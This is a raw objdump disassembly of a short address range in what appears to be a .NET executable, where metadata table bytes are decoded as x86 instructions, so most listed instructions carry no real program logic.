  40635f:	00 91 00 72 09 89    	add    %dl,-0x76f68e00(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 8b 03 0a    	add    %dl,0xa038b00(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 f2                	add    %dh,%dl
  40637f:	09 94 00 10 00 24 2f 	or     %edx,0x2f240010(%eax,%eax,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 e1                	add    %ah,%cl
  40638d:	23 58 00             	and    0x0(%eax),%ebx
  406390:	11 00                	adc    %eax,(%eax)
  406392:	5c                   	pop    %esp
  406393:	30 00                	xor    %al,(%eax)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 34 08 9a    	add    %dl,-0x65f7cc00(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 cb 15 9a    	add    %dl,-0x65ea3500(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 f9 1d 0a    	add    %dl,0xa1df918(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 bd 15 0a 00 14    	add    %bh,0x14000a15(%ebp)
  4063c9:	00 78 20             	add    %bh,0x20(%eax)
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	f3 1d 0e 00 14 00    	repz sbb $0x14000e,%eax
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 ed 23 0a    	add    %dl,0xa23ed00(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 a4 17 1d    	add    %dl,0x1d17a400(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 fd 08 1d    	add    %dl,0x1d08fd00(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 5e 16 1d    	add    %dl,0x1d165e00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 f9                	add    %bh,%cl
  406419:	23 1d 00 14 00 20    	and    0x20001400,%ebx
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 c9                	add    %cl,%cl
  406427:	02 1d 00 14 00 78    	add    0x78001400,%bl
  40642d:	20 00                	and    %al,(%eax)
  40642f:	00 00                	add    %al,(%eax)
  406431:	00 86 18 f3 1d 0e    	add    %al,0xe1df318(%esi)
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 67 02             	add    %ah,0x2(%edi)
  406444:	c3                   	ret
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 2a                	add    %ch,(%edx)
  406451:	07                   	pop    %es
  406452:	c7 00 14 00 5c 37    	movl   $0x375c0014,(%eax)
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 b2 16 53 00 15    	add    %dh,0x15005316(%edx)
  406463:	00 7b 21             	add    %bh,0x21(%ebx)
  406466:	00 00                	add    %al,(%eax)
  406468:	00 00                	add    %al,(%eax)
  40646a:	96                   	xchg   %eax,%esi
  40646b:	00 3f                	add    %bh,(%edi)
  40646d:	09 1d 00 15 00 18    	or     %ebx,0x18001500
  406473:	39 00                	cmp    %eax,(%eax)
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 1c 07 0a    	add    %dl,0xa071c00(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 c5 23 c3    	add    %dl,-0x3cdc3b00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 2a 13 d5    	add    %dl,-0x2aecd600(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 92 1a 0a    	add    %dl,0xa1a9200(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 83 1e c3    	add    %dl,-0x3ce17d00(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 a9 06 1d    	add    %dl,0x1d06a900(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 22 0b 0a    	add    %dl,0xa0b2200(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 7c    	add    %al,0x7c209600(%eax)
  4064dd:	1d e0 00 16 00       	sbb    $0x1600e0,%eax
  4064e2:	00 00                	add    %al,(%eax)
  4064e4:	00 00                	add    %al,(%eax)
  4064e6:	80 00 96             	addb   $0x96,(%eax)
  4064e9:	20 16                	and    %dl,(%esi)
  4064eb:	06                   	push   %es
  4064ec:	e4 00                	in     $0x0,%al
  4064ee:	16                   	push   %ss
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 37    	add    %al,0x37209600(%eax)
  4064f9:	13 ec                	adc    %esp,%ebp
  4064fb:	00 19                	add    %bl,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 00                	add    %al,(%eax)
  406501:	00 80 00 96 20 ba    	add    %al,-0x45df6a00(%eax)
  406507:	04 f1                	add    $0xf1,%al
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 7f    	add    %al,0x7f209600(%eax)
  406515:	03 f8                	add    %eax,%edi
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 21                	and    %ah,(%ecx)
  406523:	05 ff 00 1d 00       	add    $0x1d00ff,%eax
  406528:	ad                   	lods   %ds:(%esi),%eax
  406529:	21 00                	and    %eax,(%eax)
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 99 16 1c    	add    %dl,0x1c169900(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 c4 07 0a    	add    %dl,0xa07c400(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 99 08 0a 00 22    	add    %bl,0x22000a08(%ecx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 5c 1a 23    	add    %dl,0x231a5c00(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 cc                	add    %cl,%ah
  406569:	01 2a                	add    %ebp,(%edx)
  40656b:	01 24 00             	add    %esp,(%eax,%eax,1)
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 88 1b 84    	add    %dl,-0x7be47800(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 ab 09 1d    	add    %dl,0x1d09ab00(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 f9 1d 0a    	add    %dl,0xa1df918(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 8f 0a 9a    	add    %dl,-0x65f57100(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 e2                	add    %ah,%dl
  4065af:	08 38                	or     %bh,(%eax)
  4065b1:	01 27                	add    %esp,(%edi)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 70 08 0a    	add    %dl,0xa087000(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 45 0a 3e    	add    %dl,0x3e0a4500(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 f9                	sbb    %bh,%cl
  4065d9:	1d 0a 00 29 00       	sbb    $0x29000a,%eax
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	f3 1d 6b 01 29 00    	repz sbb $0x29016b,%eax
  4065ec:	56                   	push   %esi
  4065ed:	22 00                	and    (%eax),%al
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	00 86 00 ff 02 70    	add    %al,0x7002ff00(%esi)
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 b6 23 75    	add    %al,0x7523b600(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	7a 16                	jp     0x406628
  406612:	70 01                	jo     0x406615
  406614:	2c 00                	sub    $0x0,%al
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 66 03 75    	add    %al,0x75036600(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 97 1b 7c 01    	addl   $0x17c1b97,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 f9 1d 0a    	add    %dl,0xa1df918(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 82 07 c7 00 30    	add    %al,0x3000c707(%edx)
  40664d:	00 40 45             	add    %al,0x45(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 50 13             	add    %dl,0x13(%eax)
  406658:	84 01                	test   %al,(%ecx)
  40665a:	31 00                	xor    %eax,(%eax)
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 0e 03 2a    	add    %dl,0x2a030e00(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 44 01 93          	add    %al,-0x6d(%ecx,%eax,1)
  406675:	01 33                	add    %esi,(%ebx)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 63 01 93    	add    %dl,-0x6cfe9d00(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 e0                	add    %ah,%al
  40668f:	00 93 01 35 00 10    	add    %dl,0x10003501(%ebx)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 62 04             	add    %ah,0x4(%edx)
  40669e:	84 01                	test   %al,(%ecx)
  4066a0:	36 00 b9 22 00 00 00 	add    %bh,%ss:0x22(%ecx)
  4066a7:	00 96 00 6f 24 99    	add    %dl,-0x66db9100(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 5b 26 9f    	add    %dl,-0x60d9a500(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 22 24 a5    	add    %dl,-0x5adbde00(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 81 06 ab    	add    %dl,-0x54f97f00(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	f3 1d 0e 00 3b 00    	repz sbb $0x3b000e,%eax
  4066e8:	0b 23                	or     (%ebx),%esp
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 00                	add    %al,(%eax)
  4066ee:	91                   	xchg   %eax,%ecx
  4066ef:	18 f9                	sbb    %bh,%cl
  4066f1:	1d 0a 00 3b 00       	sbb    $0x3b000a,%eax
  4066f6:	17                   	pop    %ss
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 f3 1d b1    	add    %al,-0x4ee20ce8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 81 22 bb 01 3c    	or     %eax,0x3c01bb22(%ecx)
  406711:	00 40 23             	add    %al,0x23(%eax)
  406714:	00 00                	add    %al,(%eax)
  406716:	00 00                	add    %al,(%eax)
  406718:	e1 01                	loope  0x40671b
  40671a:	5a                   	pop    %edx
  40671b:	23 bf 01 3c 00 63    	and    0x63003c01(%edi),%edi
  406721:	23 00                	and    (%eax),%eax
  406723:	00 00                	add    %al,(%eax)
  406725:	00 e1                	add    %ah,%cl
  406727:	01 90 21 0e 00 3c    	add    %edx,0x3c000e21(%eax)
  40672d:	00 6c 23 00          	add    %ch,0x0(%ebx,%eiz,1)
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 f3 1d cb    	add    %al,-0x34e20ce8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 d7 15 d7    	add    %al,-0x28ea2900(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 39 1b dc    	add    %al,-0x23e4c700(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 6a 16 e2    	add    %al,-0x1de99600(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 59 09 e8    	add    %al,-0x17f6a700(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 03 18 ee    	add    %al,-0x11e7fcf8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	57                   	push   %edi
  40678b:	15 f4 01 42 00       	adc    $0x4201f4,%eax
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 5f 13 6b 01    	addl   $0x16b135f,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 32 0e 0e 00    	addl   $0xe0e32,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 70 05 d7 01    	addl   $0x1d70570,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 f3 01 0a 02    	addl   $0x20a01f3,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	b5 07                	mov    $0x7,%ch
  4067d2:	dc 01                	faddl  (%ecx)
  4067d4:	44                   	inc    %esp
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 cb 21 d7    	add    %al,-0x28de3500(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 ee 18 d7    	add    %al,-0x28e71200(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 1e 0a d7    	add    %al,-0x28f5e200(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 62 15 0f 02    	addl   $0x20f1562,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 b8 00 0f 02    	addl   $0x20f00b8,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	db 06                	fildl  (%esi)
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 d5 24 1a    	add    %al,0x1a24d500(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 5b 0b 1f    	add    %al,0x1f0b5b00(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	69 0b 23 02 49 00    	imul   $0x490223,(%ebx),%ecx
  406854:	28 4a 00             	sub    %cl,0x0(%edx)
  406857:	00 00                	add    %al,(%eax)
  406859:	00 86 00 a3 26 27    	add    %al,0x2726a300(%esi)
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	17                   	pop    %ss
  40686b:	08 2b                	or     %ch,(%ebx)
  40686d:	02 49 00             	add    0x0(%ecx),%cl
  406870:	bc 4a 00 00 00       	mov    $0x4a,%esp
  406875:	00 86 00 15 09 31    	add    %al,0x31091500(%esi)
  40687b:	02 4a 00             	add    0x0(%edx),%cl
  40687e:	85 24 00             	test   %esp,(%eax,%eax,1)
  406881:	00 00                	add    %al,(%eax)
  406883:	00 86 00 a9 00 36    	add    %al,0x3600a900(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 27                	add    %ah,(%edi)
  406895:	18 3c 02             	sbb    %bh,(%edx,%eax,1)
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 db 1b 42    	add    %al,0x421bdb00(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 53 01 42    	add    %al,0x42015300(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	38 19                	cmp    %bl,(%ecx)
  4068c0:	dc 01                	faddl  (%ecx)
  4068c2:	50                   	push   %eax
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 0f 1b 0e    	add    %al,0xe1b0f00(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 be 02 6b    	add    %al,0x6b02be00(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 e2 04 47    	add    %al,0x4704e200(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 3b 03 4b    	add    %al,0x4b033b00(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	fc                   	cld
  406905:	20 50 02             	and    %dl,0x2(%eax)
  406908:	53                   	push   %ebx
  406909:	00 1f                	add    %bl,(%edi)
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	f5                   	cmc
  406913:	24 55                	and    $0x55,%al
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	6c                   	insb   (%dx),%es:(%edi)
  406921:	13 2b                	adc    (%ebx),%ebp
  406923:	02 55 00             	add    0x0(%ebp),%dl
  406926:	24 4d                	and    $0x4d,%al
  406928:	00 00                	add    %al,(%eax)
  40692a:	00 00                	add    %al,(%eax)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	a8 0a                	test   $0xa,%al
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	cd 26                	int    $0x26
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	e5 09                	in     $0x9,%eax
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	a9 23 0f 02 58       	test   $0x58020f23,%eax
  40695d:	00 34 25 00 00 00 00 	add    %dh,0x0(,%eiz,1)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	6a 14                	push   $0x14
  406968:	47                   	inc    %edi
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	77 14                	ja     0x40698a
  406976:	6b 01 59             	imul   $0x59,(%ecx),%eax
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	e0 1c                	loopne 0x4069a0
  406984:	23 02                	and    (%edx),%eax
  406986:	5a                   	pop    %edx
  406987:	00 4d 25             	add    %cl,0x25(%ebp)
  40698a:	00 00                	add    %al,(%eax)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	ee                   	out    %al,(%dx)
  406991:	1c 15                	sbb    $0x15,%al
  406993:	02 5a 00             	add    0x0(%edx),%bl
  406996:	56                   	push   %esi
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	36 21 27             	and    %esp,%ss:(%edi)
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	42                   	inc    %edx
  4069ad:	21 55 02             	and    %edx,0x2(%ebp)
  4069b0:	5b                   	pop    %ebx
  4069b1:	00 c0                	add    %al,%al
  4069b3:	54                   	push   %esp
  4069b4:	00 00                	add    %al,(%eax)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	86 08                	xchg   %cl,(%eax)
  4069ba:	46                   	inc    %esi
  4069bb:	25 5a 02 5c 00       	and    $0x5c025a,%eax
  4069c0:	67 25 00 00 00 00    	addr16 and $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	14 10                	adc    $0x10,%al
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
